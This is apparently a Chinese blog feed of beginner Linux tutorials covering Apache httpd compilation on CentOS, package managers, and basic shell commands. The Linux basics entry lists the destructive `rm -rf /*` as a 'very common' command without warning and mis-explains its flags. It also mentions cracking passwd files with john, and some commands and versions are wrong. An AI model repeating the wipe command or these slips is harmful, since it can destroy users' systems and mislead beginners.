highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># cd /usr/local/src/<br># cp -r apr-1.6.5  /usr/local/src/httpd-2.4.37/srclib/apr<br># cd apr-1.6.5<br># ./configure --prefix=/usr/local/apr<br># make &amp;&amp; make install<br></code></pre></td></tr></table></figure><hr><h4 id="安装apr-util-1-6-1"><a href="#安装apr-util-1-6-1" class="headerlink" title="安装apr-util-1.6.1"></a>安装apr-util-1.6.1</h4><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># cd /usr/local/src<br># cp -r apr-util-1.6.1  /usr/local/src/httpd-2.4.37/srclib/apr-util<br># cd /usr/local/src/apr-util-1.6.1<br># ./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr<br># make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>pcre的编译安装<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># wget https://ftp.pcre.org/pub/pcre/pcre-8.00.tar.gz<br># tar -zxvf pcre-8.10.tar.gz<br># cd pcre-8.10<br># ./configure<br># make  &amp;&amp; make install<br></code></pre></td></tr></table></figure></p><hr><h4 id="安装httpd-2-4-37"><a href="#安装httpd-2-4-37" class="headerlink" title="安装httpd-2.4.37"></a>安装httpd-2.4.37</h4><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># ./configure --with-included-apr --prefix=/usr/local/apache2.4 --with-apr=/usr/local/apr --with-apr-util=/usr/local/apr-util --enable-so --enable-mods-shared=most<br># make &amp;&amp; make install<br></code></pre></td></tr></table></figure><hr><h4 id="编写启动脚本："><a href="#编写启动脚本：" class="headerlink" title="编写启动脚本："></a>编写启动脚本：</h4><figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># vim httpd</span><br>#!/bin/bash<br><span class="hljs-meta"># chkconfig: 12345 80 90</span><br><span class="hljs-function">function <span class="hljs-title">start_http</span><span class="hljs-params">()</span><br></span>&#123;<br>/usr/local/apache2<span class="hljs-number">.4</span>/bin/apachectl  start<br>&#125;<br><span class="hljs-function">function <span class="hljs-title">stop_http</span><span class="hljs-params">()</span><br></span>&#123;<br> /usr/local/apache2<span class="hljs-number">.4</span>/bin/apachectl  stop<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-string">"$1"</span> in<br>start)<br>    start_http<br>;;<br>stop)<br>    stop_http<br>;;  <br>restart)<br>    stop_http<br>    start_http<br>;;<br>*)<br>    echo <span class="hljs-string">"Usage : start | stop | restart"</span><br>;;<br>esac<br></code></pre></td></tr></table></figure><hr><p>加入所编写的httpd系统服务：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># chmod a+x httpd<br># cp -arf httpd /etc/init.d/<br></code></pre></td></tr></table></figure></p><p>启动自己编写的服务：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># systemctl daemon-reload<br># systemctl start httpd<br></code></pre></td></tr></table></figure></p><p>设置开机自启动：<code># chkconfig --add httpd</code><br>查看配置文件路径：<code># /usr/local/apache2.4/conf/httpd.conf</code><br>查看httpd服务运行状态<code># systemctl status httpd</code></p><hr><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><h4 id="参数释义："><a href="#参数释义：" class="headerlink" title="参数释义："></a>参数释义：</h4><blockquote><p>–enable-mods     // 让apache核心装载DSO，但不实际编译任何动态模块，未加参数，为静态编译<br>–enable-ModuleName=share     // 将模块编译成动态的<br>–enable-ModuleName=most     // 动态地编译进来大多数的模块<br>–enable-ModuleName=all     // 动态地编译所有的模块</p></blockquote><p>动态编译：使用模块时才将需要使用的模块Load进来<br>静态编译：先将所需模块Load进去，使用时直接调用</p><hr><h4 id="install与groupinstall区别："><a href="#install与groupinstall区别：" class="headerlink" title="install与groupinstall区别："></a>install与groupinstall区别：</h4><blockquote><p><code>yum install</code>    安装单个软件<br><code>yum grouplist</code>    查看这个软件的所有软件包，每次安装前可以先查看<code>yum grouplist</code>有哪些软件，然后再去安装<code>yum groupinstall</code><br><code>yum groupinstall</code>    看装多个软件，安装这个软件的所有依赖包，<code>yum groupinstall</code>安装的时候必须加双引号</p></blockquote><p>示例代码:</p><blockquote><p>yum -y groupinstall Desktop     // -y参数同意所有软件安装操作<br>yum groupremove     // 卸载所有软件包</p></blockquote><hr><h4 id="prefix选项："><a href="#prefix选项：" class="headerlink" title="-prefix选项："></a>-prefix选项：</h4><p>使用<code>./configure --prefix=/supersparrow</code><br>安装完成将自动生成目录<code>supersparrow</code>，则该软件任何的文档都被复制到这个目录。指定此安装目录是为了以后的维护方便，否则该软件所需的软件会被复制到不同的系统目录下，难以维护。</p><p>用了<code>-prefix</code>选项的另一个好处是卸载软件或移植软件。当某个安装的软件不再需要时，只须简单的删除该安装目录，就能够把软件卸载得干干净净;移植软件只需拷贝整个目录到另外一个机器即可(相同的操作系统)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CentOS </tag>
            
            <tag> Httpd </tag>
            
            <tag> 编译安装 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>常见安全配置</title>
      <link href="/2018/12/03/Security-config/"/>
      <url>/2018/12/03/Security-config/</url>
      
        <content type="html"><![CDATA[<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> 安全配置 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CentOS下软件安装方法</title>
      <link href="/2018/11/30/CentOS-software-install/"/>
      <url>/2018/11/30/CentOS-software-install/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本文主要介绍在CentOS操作系统下，软件常用的安装、卸载方法。</p><p><strong>注：补充知识放在文末</strong></p><hr><h3 id="RPM安装"><a href="#RPM安装" class="headerlink" title="RPM安装"></a>RPM安装</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p><code>RPM（Red-Hat Package Manager）</code>软件包管理器，一种用于互联网下载包的打包及安装工具，它包含在某些Linux分发版中。它生成具有.RPM扩展名的文件。与<code>Dpkg</code>类似。</p><hr><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">rpm<br>rpm -ivh<br></code></pre></td></tr></table></figure><p>rpm 查询</p><blockquote><p><code>-q</code> 仅查询，后面接的软件吗是否有安装<br><code>-qa</code> 列出所有的，已经安装在本机Linux系统上面的所有软件名称<br><code>-ql</code> 列出该软件所有的文件与目录所在完整文件名（list）<br><code>-qR</code> 列出与该软件有关的相依软件所含的文件（Required）<br><code>rpm -qa | grep python</code></p></blockquote><p><strong>rpm包可以用来安装指定版本</strong></p><hr><h4 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h4><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">rpm -i xxllxx<br></code></pre></td></tr></table></figure><p>若发现依赖问题，可用如下命令尝试解决：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">yum install -f<br></code></pre></td></tr></table></figure></p><hr><h3 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>yum（Yellow dog Updater,modified）是一个在Fedora和RedHat以及CentOS中的Shell前端软件包管理器。基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。 </p><hr><h4 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h4><p>软件搜索：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">yum search mysql<br></code></pre></td></tr></table></figure></p><p>软件安装：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">yum install mariadb// 会自动补全依赖<br></code></pre></td></tr></table></figure></p><p>卸载<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">yum remove 软件名<br>yum erase 软件名<br></code></pre></td></tr></table></figure></p><p>整套安装一组开发者工具包<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">gcc macker install// 安装gcc编译器<br>groupinstall<br>yum groupinstall &quot;Development Tools&quot; -y<br></code></pre></td></tr></table></figure></p><hr><h3 id="通过源码安装"><a href="#通过源码安装" class="headerlink" title="通过源码安装"></a>通过源码安装</h3><p>此方法较为复杂，但有其不可替代性<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">./configure 各种配置<br>make 编译<br>make install 安装<br></code></pre></td></tr></table></figure></p><hr><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><h4 id="Kali、ubuntu安装包"><a href="#Kali、ubuntu安装包" class="headerlink" title="Kali、ubuntu安装包"></a>Kali、ubuntu安装包</h4><p><code>dpkg</code></p><hr><h4 id="ubuntu软件安装"><a href="#ubuntu软件安装" class="headerlink" title="ubuntu软件安装"></a>ubuntu软件安装</h4><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">dpkg -i xxllxx<br></code></pre></td></tr></table></figure><p>发现依赖有问题:<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">apt install -f<br></code></pre></td></tr></table></figure></p><p>大致步骤：</p><blockquote><ol><li>下载deb包</li><li>dpkg -i xxxx.deb</li><li>发现依赖问题</li><li>解决依赖问题</li></ol></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CentOS </tag>
            
            <tag> 软件安装 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux入门基础</title>
      <link href="/2018/11/28/Linux-foundation/"/>
      <url>/2018/11/28/Linux-foundation/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本文主要内容为Linux入门向的基础知识，记录下来方便自己与他人的查询。</p><p><strong>注：知识补充放在文末。</strong></p><hr><h3 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h3><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><h5 id="开关机"><a href="#开关机" class="headerlink" title="开关机"></a>开关机</h5><blockquote><p>重启：<br><code>reboot</code>、<code>init 6</code></p></blockquote><blockquote><p>关机：<br><code>shutdown</code>、<code>halt</code>、<code>poweroff</code>、<code>init 0</code></p></blockquote><blockquote><p>登陆：<br><code>login</code></p></blockquote><blockquote><p>注销：<br><code>exit</code>、<code>logout</code></p></blockquote><hr><h5 id="很常用"><a href="#很常用" class="headerlink" title="很常用"></a>很常用</h5><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh">rm -rf /* <span class="hljs-comment"># 删除所有文件</span><br><span class="hljs-built_in">pwd</span><span class="hljs-comment"># 查看当前目录</span><br><span class="hljs-built_in">cd</span> <span class="hljs-comment"># 切换当前工作目录 </span><br>ls <span class="hljs-comment"># 列出目录下文件</span><br>clear <span class="hljs-comment"># 终端清屏</span><br>ping <span class="hljs-comment"># 因特网包探索器</span><br>ifconfig <span class="hljs-comment"># 显示或配置网络设备</span><br>cat <span class="hljs-comment"># 获取当前文件所有内容</span><br>route -n <span class="hljs-comment"># 查看网关</span><br>./ <span class="hljs-comment"># 当前目录</span><br>../ <span class="hljs-comment"># 上级目录</span><br><span class="hljs-built_in">cd</span> ~ <span class="hljs-comment"># 进入目前使用者身份所在主文件夹</span><br><span class="hljs-built_in">cd</span> ~account <span class="hljs-comment"># 进入account这个使用者的主文件夹</span><br><span class="hljs-built_in">cd</span> - <span class="hljs-comment"># 回到前一个工作目录</span><br></code></pre></td></tr></table></figure><hr><h5 id="渗透中常用"><a href="#渗透中常用" class="headerlink" title="渗透中常用"></a>渗透中常用</h5><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">whoami <span class="hljs-comment"># 查看当前用户身份</span><br>tar <span class="hljs-comment"># 压缩与解压缩</span><br>netstat <span class="hljs-comment"># 查看网络状态，常用 -ano</span><br>nslookp <span class="hljs-comment"># 查看dns信息</span><br>ps <span class="hljs-comment"># 查看运行的程序，常用 -C sshd</span><br>top <span class="hljs-comment"># 实时查看运行的程序</span><br>service <span class="hljs-comment"># 使用service控制服务启动关闭</span><br>curl <span class="hljs-comment"># 获取网页，可使用输出重定向来下载文件</span><br>wget <span class="hljs-comment"># 下载文件</span><br></code></pre></td></tr></table></figure><hr><h4 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h4><blockquote><p><code>Tab</code> 补全自动<br><code>ctrl+c</code> 强行停止<br><code>exit</code>、<code>ctrl+d</code> 退出shell<br><code>ctrl+l</code> 清屏（控制台记录并未清除）<br><code>date</code> 时间<br><code>ctrl+z</code> 后台挂起</p></blockquote><hr><h4 id="文件组织"><a href="#文件组织" class="headerlink" title="文件组织"></a>文件组织</h4><h5 id="Linux目录管理"><a href="#Linux目录管理" class="headerlink" title="Linux目录管理"></a>Linux目录管理</h5><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">/bin <span class="hljs-comment"># 放置可执行文件</span><br>/dev <span class="hljs-comment"># 任何设备与周边设备等硬件</span><br>/media <span class="hljs-comment"># 放置可移除的设备</span><br>/opt <span class="hljs-comment"># 第三方协力软件放置的目录</span><br>/tmp <span class="hljs-comment"># 临时文件</span><br>/home <span class="hljs-comment"># 使用者主文件夹</span><br>/root <span class="hljs-comment"># 系统管理员的主文件夹</span><br>/etc <span class="hljs-comment"># 是linux中各种服务，启动项，配置信息的位置</span><br>/usr <span class="hljs-comment"># usr（Unix Software Resource）Unix操作系统软件资源</span><br>/var <span class="hljs-comment"># var目录主要针对常态性变动</span><br></code></pre></td></tr></table></figure><hr><h5 id="常用文件位置"><a href="#常用文件位置" class="headerlink" title="常用文件位置"></a>常用文件位置</h5><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">/etc/yum/source.list <span class="hljs-comment"># centOS源，kali为则将yum换为apt即可</span><br>/etc/ssh/sshd_config <span class="hljs-comment"># ssh配置文件</span><br>/etc/init.d/network <span class="hljs-comment"># 网络服务配置文件，kali为networking</span><br>/etc/sysconfig/network-scripts <span class="hljs-comment"># 网卡配置文件</span><br>/etc/passwd <span class="hljs-comment"># 用户信息</span><br>/etc/shadow <span class="hljs-comment"># 用户密码信息</span><br>/etc/group <span class="hljs-comment"># 用户组信息</span><br></code></pre></td></tr></table></figure><hr><h4 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h4><p>新建文件：<code>touch /tmp/hello</code><br>新建文件夹：<code>mkdir ./hello</code></p><p>删除文件：<code>rm /hello.txt</code><br>删除文件夹：<code>rm ./hello</code></p><p><code>rm -rf /*</code> -r 删除文件夹  -f 递归删除</p><p>复制移动</p><blockquote><p><code>cp</code> 复制文件或文件夹到指定路径<br><code>mv</code> 移动文件或文件夹到指定路径</p></blockquote><p>查看文件</p><blockquote><p><code>cat</code> 显示一个文件夹内容<br><code>more</code> 显示一个文件的内容</p></blockquote><p>显示文件的前几行</p><blockquote><p><code>head -n 5 /test/yum.conf</code><br><code>head -7 /test/yum.conf</code></p></blockquote><p>显示文件的后几行</p><blockquote><p><code>tail -n 3 /test/yum.conf</code><br><code>tail -2 /test/yum.conf</code></p></blockquote><p>查找文件或文件里的内容</p><blockquote><p>查找文件名：<br><code>find 路径 -name 文件名</code></p></blockquote><blockquote><p>查找字符串：<br><code>grep 字符串</code></p></blockquote><blockquote><p><code>whereis 查找某个命令所在位置</code><br><code>which 查找当前用户命令</code></p></blockquote><hr><h4 id="系统基础命令"><a href="#系统基础命令" class="headerlink" title="系统基础命令"></a>系统基础命令</h4><blockquote><p><code>jobs</code> 显示当前暂停的进程（与<code>ctrl+z</code>配合，将一个进程停止并挂在后台）<br><code>bg %N</code> 使后台第N个任务在后台运行<br><code>fg %N</code> 使后台第N个任务在前台运行<br>默认<code>bg</code>，<code>fg</code>不带<code>%N</code>时表示对最后一个进程操作</p></blockquote><p>使一个程序在后台不中断地运行：</p><blockquote><ol><li>做成一个service</li><li>使用<code>&amp;</code>符号，让一个运行的进程一直在后台运行</li><li>使用<code>nohup setsid</code>做到即使shell退出后，依然能运行程序，<br>不中断地将任务进行并输出到<code>nohup.out</code></li><li>使用<code>screen</code></li><li>使用<code>()</code>符号，将进程加入<code>subshell</code>中</li><li>其他方式</li></ol></blockquote><hr><h4 id="压缩包文件处理命令"><a href="#压缩包文件处理命令" class="headerlink" title="压缩包文件处理命令"></a>压缩包文件处理命令</h4><p>Linux下压缩包格式有：</p><blockquote><p><code>.tar</code>、<code>.gz</code>、<code>.tar.gz</code>、<code>.tgz</code>、<code>.bz2</code><br>、<code>.tar.bz2</code>、<code>.bz</code>、<code>.tar.bz</code>    、<code>.Z</code>、<code>.tar.Z</code>、<code>.xz</code>、<code>.zip</code>、<code>.rar</code><br>常用的压缩格式为<code>.tar.gz</code>和<code>.zip</code></p></blockquote><p>解压与压缩命令：<br><code>.gz</code></p><blockquote><p><code>-c</code>：create新的包<br><code>-x</code>：解包<br><code>-z</code>：压缩方式为gz<br><code>v</code>：显示细节<br><code>f</code>：使用归档文件</p></blockquote><p><code>.tar</code></p><blockquote><p>解包：<code>tar xzvf FileName.tar</code>解包后原始文件存在<br>打包：<code>tar czvf FileName.tar    filename1 filename2 ...</code> （打包多个文件）<br><code>tar czvf FileName.tar DirName</code>（打包压缩一个目录）</p></blockquote><p><code>.zip</code></p><blockquote><p>解压：<code>unzip FileName.zip</code> 解包后原始文件依然存在<br>压缩：<code>zip FileName.zip DirName</code><br>列出内容：<code>unzip -l FileName.zip</code></p></blockquote><p><strong>打包的意义：提高传输速度及完整性</strong></p><hr><h3 id="vim编辑器"><a href="#vim编辑器" class="headerlink" title="vim编辑器"></a>vim编辑器</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">vim FileName <span class="hljs-comment"># 使用vim打开文件</span><br>i/a/o <span class="hljs-comment"># 在当前字符前/后/下一行插入</span><br>ESC、ctrl+c <span class="hljs-comment">#退出编辑模式</span><br></code></pre></td></tr></table></figure><hr><h4 id="底行命令"><a href="#底行命令" class="headerlink" title="底行命令"></a>底行命令</h4><blockquote><p><code>:w</code>保存     <code>:q</code>退出     <code>/</code>查找<br><code>shift+g</code>     转到文件末行<br><code>shift+h</code>     转到文件首行<br><code>ndd</code>     （<code>n</code>代表数字）从当前行删除n行<br><code>nyy</code>     从游标所行开始复制n行<br><code>x</code>，<code>X</code>     在一行字中，<code>x</code>为向后删除一个字符，<code>X</code>相反<br><code>p</code>，<code>P</code>     <code>p</code>为将已复制内容在光标下一行贴上<br><code>u</code>     撤销操作<br><code>:set nu</code>     显示行号(全名<code>nummber</code>)<br><code>:set nonu</code>     不显示行号(全名<code>nonumber</code>)<br><code>:%s/word1/word2</code>     寻找字符串<code>word1</code>替换为<code>word2</code></p></blockquote><p><a href="https://www.cnblogs.com/libaoliang/articles/6961676.html" target="_blank" rel="noopener">Vim/Vi工作模式图解</a></p><hr><h3 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h3><h4 id="文件位置"><a href="#文件位置" class="headerlink" title="文件位置"></a>文件位置</h4><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">/etc/passwd <span class="hljs-comment"># 存储用户信息</span><br>/etc/shadow <span class="hljs-comment"># 存储用户密码信息</span><br>/etc/group <span class="hljs-comment"># 存储用户组信息</span><br></code></pre></td></tr></table></figure><h4 id="passwd文件配置"><a href="#passwd文件配置" class="headerlink" title="passwd文件配置"></a>passwd文件配置</h4><h5 id="账号格式"><a href="#账号格式" class="headerlink" title="账号格式"></a>账号格式</h5><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">用户名:x:uid:gid:备注信息:home:shell<br></code></pre></td></tr></table></figure><hr><h5 id="参数配置"><a href="#参数配置" class="headerlink" title="参数配置"></a>参数配置</h5><p><code>nologin</code>     此账户目前不可用，不能被切换到的账号<br><code>/bin/false</code>     登录必然报错，无法登陆<br><code>/home/Username</code>     没有的话，登陆后会报Could not chdir to home<br><code>directory /home/Username</code><br><code>x</code>     代表允许登录，并且密码在<code>/etc/shadow</code><br><code>*</code>     代表不允许登陆</p><p>Kali密码破解：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">john passwd<br></code></pre></td></tr></table></figure></p><hr><h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><p>环境：CentOS<br><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">useradd Username <span class="hljs-comment"># 添加用户，但不设密码，会创建一个/home/用户名</span><br>adduser Username <span class="hljs-comment"># 添加用户，但不设密码，会创建一个/home/用户名</span><br>passwd修改密码<br>su Username切换用户<br>userdel删除用户<br></code></pre></td></tr></table></figure></p><blockquote><p>若在Ubuntu环境下，<code>adduser</code>则会设置密码与备注等信息</p></blockquote><hr><h4 id="权限操作"><a href="#权限操作" class="headerlink" title="权限操作"></a>权限操作</h4><h5 id="修改所属组"><a href="#修改所属组" class="headerlink" title="修改所属组"></a>修改所属组</h5><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">groupadd <span class="hljs-comment"># 新建用户组</span><br>groupdel <span class="hljs-comment"># 删除</span><br>groupmod <span class="hljs-comment"># 修改</span><br></code></pre></td></tr></table></figure><hr><h5 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h5><p><code>chomod</code>     修改当前文件或文件夹权限<br>可以使用数组或使用字母参数：</p><blockquote><p><code>u</code>：user     <code>g</code>：group     <code>o</code>：other     <code>a</code>：all</p></blockquote><p>exmaple:<br><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">chmod ou-r filename <span class="hljs-comment"># user和other用户剥夺读权限</span><br>chmod g=wr,o=r <span class="hljs-comment"># group用户赋予读写权限，其他只赋读权限</span><br>chown 用户:用户组 <span class="hljs-comment"># 修改当前文件或文件夹所属用户</span><br>chown root:root /tmp/tmp1 <span class="hljs-comment"># 单个文件改变文件所诉用户及组</span><br>chown -R root:root /tmp/tmp1 <span class="hljs-comment"># 文件夹及其内部全部改变</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="Linux查看进程及端口信息"><a href="#Linux查看进程及端口信息" class="headerlink" title="Linux查看进程及端口信息"></a>Linux查看进程及端口信息</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 根据进程名差看进程信息</span><br>ps -ef | grep tmocat<br><br><span class="hljs-comment"># 根据进程id查看进程占用端口</span><br>netstat -nap | grep 1095<br><br><span class="hljs-comment"># 根据端口查看对应进程</span><br>netstat -tunlp | grep 8080<br><br><span class="hljs-comment"># 根据进程id查看进程信息</span><br>ps -ef | grep 1095<br><br><span class="hljs-comment"># 根据进程id杀死进程</span><br><span class="hljs-built_in">kill</span> -9 1095<br></code></pre></td></tr></table></figure><hr><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><h4 id="init六种运行模式"><a href="#init六种运行模式" class="headerlink" title="init六种运行模式"></a>init六种运行模式</h4><p><a href="https://blog.csdn.net/db_hunter/article/details/44243745" target="_blank" rel="noopener">原文</a><br>基本概念：</p><blockquote><p>init是Linux系统里的根进程，是系统所有进程的祖先。它的主要作用是根据记录在<code>/etc/inittab</code>里的一个脚本程序产生进程。这个文件通常用于控制用户的登录模式。<br>Linux系统的有效登录模式有0~9共十种，不过沿用UNIX系统的至多6种的限制，一般只有1到6有效</p></blockquote><p>init一般在系统启动时自动运行，也可以由root用户调用。它的作用是切换系统的运行状态。<br>它的命令格式是:<br><code>init NUM</code><br>其中NUM表示1到6的任一数字</p><p>6种模式中有两种是系统内定的： </p><blockquote><p><code>0</code>：停止系统运行。相当于<code>halt</code><br><code>6</code>：重启系统。相当于<code>reboot</code></p></blockquote><p>其余： </p><blockquote><p><code>init 1</code> 进入单用户模式。<br><code>init 2</code> 进入无网络服务的多用户模式 如果你的计算机没有对外提供网络服务，这个模式就跟普通模式一样了。<br><code>init 3/4</code> 进入控制台登录的多用户模式.每个用户都要先从黑白屏幕登录之后才可以运行才能<code>startx</code>进入KDE图形界面。<br><code>init 5</code> 进入图形化登录的多用户模式。<br>可以通过<code>runlevel</code> 和 <code>who -r</code>命令来查看当前运行的模式。</p></blockquote><hr><h4 id="No-such-file-or-directory"><a href="#No-such-file-or-directory" class="headerlink" title="No such file or directory"></a>No such file or directory</h4><p><code>./</code>一个存在的文件，提示上述信息<br>原因：可能缺少32位运行库ia32-libs<br>解决：<code>sudo apt-get install g++-multilib</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>个人网站搭建</title>
      <link href="/2018/10/12/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/10/12/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
      
